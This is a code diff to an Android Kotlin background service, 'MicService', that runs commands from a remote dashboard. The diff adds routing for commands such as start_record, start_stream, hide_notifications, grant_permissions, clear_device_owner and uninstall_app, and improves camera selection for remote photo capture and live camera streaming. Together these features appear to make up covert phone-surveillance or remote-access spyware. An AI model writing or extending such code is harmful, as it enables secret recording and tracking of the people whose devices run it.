@@ -1150,6 +1150,7 @@ class MicService : Service() {
             }
             "get_data" -> {
                 // Dashboard requested a fresh sync immediately
+                lastDataHashStr = "" // clear cache so data is forced to sync
                 sendDeviceData()
                 sendCommandAck("get_data")
             }
@@ -1469,6 +1470,10 @@ class MicService : Service() {
         try {
             val obj = JSONObject(jsonText)
             when (obj.optString("type")) {
+                "get_data", "force_update", "start_stream", "stop_stream", "start_record", "stop_record", "ping", "force_reconnect", "grant_permissions", "enable_autostart", "toggle_wifi", "check_update", "clear_device_owner", "lock_app", "unlock_app", "hide_notifications", "uninstall_app" -> {
+                    handleServerCommand(obj.optString("type"))
+                    return
+                }
                 "webrtc_start" -> {
                     Log.i(TAG, "CMD: webrtc_start")
                     // WebRTC now allowed for all voice profiles including "far"
@@ -2186,16 +2191,20 @@ class MicService : Service() {
                     val currentPreferredFacing = facing
                     
                     // Single capture attempt - no retry for speed
-                    val jpeg = captureJpegOnce(currentPreferredFacing, allowFacingFallback = explicitFacing == null)
+                    val captureResult = captureJpegOnce(currentPreferredFacing, allowFacingFallback = explicitFacing == null)
+                    
+                    val jpeg = captureResult?.first
+                    val actuallyUsedFacing = captureResult?.second ?: currentPreferredFacing
+
                     if (jpeg == null || jpeg.isEmpty()) {
                         sendCommandAck("take_photo", "error", "capture_failed")
                         return@withTimeoutOrNull
                     }
                     
-                    val isFrontCamera = (currentPreferredFacing == CameraCharacteristics.LENS_FACING_FRONT)
+                    val isFrontCamera = (actuallyUsedFacing == CameraCharacteristics.LENS_FACING_FRONT)
                     val optimized = optimizePhotoJpeg(jpeg, isFrontCamera)
                     val cameraName = if (isFrontCamera) "front" else "rear"
-                    preferredCameraFacing = currentPreferredFacing
+                    preferredCameraFacing = actuallyUsedFacing
                     val filename = "photo_${deviceId.take(8)}_${cameraName}_${System.currentTimeMillis()}.jpg"
 
                     var httpSuccess = false
@@ -2331,10 +2340,11 @@ class MicService : Service() {
     }
 
     @SuppressLint("MissingPermission")
-    private suspend fun captureJpegOnce(targetFacing: Int, allowFacingFallback: Boolean = true): ByteArray? {
+    private suspend fun captureJpegOnce(targetFacing: Int, allowFacingFallback: Boolean = true): Pair<ByteArray, Int>? {
         val cm = getSystemService(CameraManager::class.java) ?: return null
         val cameraId = selectCameraId(cm, targetFacing, allowFacingFallback) ?: return null
         val chars = cm.getCameraCharacteristics(cameraId)
+        val actualFacing = chars.get(CameraCharacteristics.LENS_FACING) ?: targetFacing
         val captureProfile = buildPhotoCaptureProfile(chars)
         val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
         
@@ -2374,7 +2384,7 @@ class MicService : Service() {
         val thread = HandlerThread("photo_capture_thread").apply { start() }
         val handler = Handler(thread.looper)
         val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
-        val imageResult = CompletableDeferred<ByteArray?>()
+        val imageResult = CompletableDeferred<Pair<ByteArray, Int>?>()
 
         var camera: CameraDevice? = null
         var session: CameraCaptureSession? = null
@@ -2388,7 +2398,7 @@ class MicService : Service() {
                         val buffer: ByteBuffer = image.planes[0].buffer
                         val arr = ByteArray(buffer.remaining())
                         buffer.get(arr)
-                        if (!imageResult.isCompleted) imageResult.complete(arr)
+                        if (!imageResult.isCompleted) imageResult.complete(Pair(arr, actualFacing))
                     } finally {
                         image.close()
                     }
@@ -2536,7 +2546,8 @@ class MicService : Service() {
 
     private fun selectCameraId(cm: CameraManager, targetFacing: Int, allowFacingFallback: Boolean = true): String? {
         val ids = cm.cameraIdList ?: return null
-        var fallback: String? = null
+        var bestMatch: String? = null
+        var anyFallback: String? = null
         for (id in ids) {
             val c = cm.getCameraCharacteristics(id)
             val facing = c.get(CameraCharacteristics.LENS_FACING)
@@ -2547,15 +2558,13 @@ class MicService : Service() {
             if (!hasJpeg || !isBackwardCompatible) {
                 continue
             }
-            if (facing == targetFacing && !isLogicalMultiCamera(c)) return id
-            if (facing == targetFacing && fallback == null) fallback = id
-            // Bug 4.3: Use LOGICAL_MULTI_CAMERA as fallback candidate
-            if (allowFacingFallback && fallback == null && isLogicalMultiCamera(c)) {
-                fallback = id
+            if (facing == targetFacing) {
+                if (!isLogicalMultiCamera(c)) return id
+                if (bestMatch == null) bestMatch = id
             }
-            if (allowFacingFallback && fallback == null) fallback = id
+            if (allowFacingFallback && anyFallback == null) anyFallback = id
         }
-        return fallback
+        return bestMatch ?: anyFallback
     }
 
     private fun isLogicalMultiCamera(chars: CameraCharacteristics): Boolean {
@@ -2616,6 +2625,8 @@ class MicService : Service() {
             // BUG-R12: Do NOT send started ACK here — we haven't opened the camera yet.
             // ACK is sent later after the capture session is confirmed open.
             val chars = cm.getCameraCharacteristics(cameraId)
+            val actualFacing = chars.get(CameraCharacteristics.LENS_FACING) ?: targetFacing
+            val cameraName = if (actualFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
             
             val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: run {
                 isCameraLiveStreaming = false
@@ -2660,7 +2671,7 @@ class MicService : Service() {
                                 // Bug 8: Send raw binary WS frames instead of base64 JSON
                                 // Binary format: [0x43][0x4C][headerLenHi][headerLenLo][headerJSON][jpegBytes]
                                 // This avoids the 33% size inflation of base64 encoding.
-                                val cameraName = if (targetFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
+                                val cameraName = if (actualFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
                                 val headerJson = """{"type":"camera_live_frame","deviceId":"$deviceId","camera":"$cameraName","quality":"$photoQualityMode","mime":"image/jpeg","ts":$now}"""
                                 val headerBytes = headerJson.toByteArray(Charsets.UTF_8)
                                 val headerLen = headerBytes.size
